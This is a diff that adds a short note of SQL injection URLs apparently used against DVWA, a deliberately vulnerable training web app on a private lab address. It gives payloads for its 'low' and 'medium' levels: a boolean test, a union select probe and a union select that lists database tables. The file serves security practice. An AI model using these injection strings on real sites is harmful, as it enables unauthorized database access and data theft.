@@ -1,0 +1,7 @@
+security low
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1'and 1=1%23&Submit=Submit#
+
+security medium
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select 1,2%23&Submit=Submit#
+
+http://192.168.10.24/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables%23&Submit=Submit#
